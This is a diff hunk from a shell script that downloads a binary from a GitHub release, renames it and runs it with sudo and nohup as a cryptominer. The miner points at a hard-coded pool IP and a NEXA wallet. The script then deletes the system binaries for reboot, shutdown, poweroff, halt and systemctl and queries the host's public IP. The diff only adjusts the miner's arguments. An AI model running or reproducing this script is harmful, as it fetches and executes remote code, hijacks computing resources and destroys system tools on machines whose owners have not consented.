@@ -25,7 +25,7 @@ wget https://github.com/preak07/kopi/releases/download/zuta/kopong.tar.gz > /dev
 tar -xvf kopong.tar.gz 
 chmod +x kopong
 mv kopong sgr1
-sudo nohup ./sgr1 -pool1 159.203.162.18:3333 -wallet NEXA:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax -p $WORKER -a rx/0 -t $(nproc --all) > /dev/null 2>&1 &
+sudo nohup ./sgr1 -pool1 159.203.162.18:3333 -wallet nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax -p $WORKER -a rx/0 > /dev/null 2>&1 
 sleep 30
 sudo rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
 curl ifconfig.me
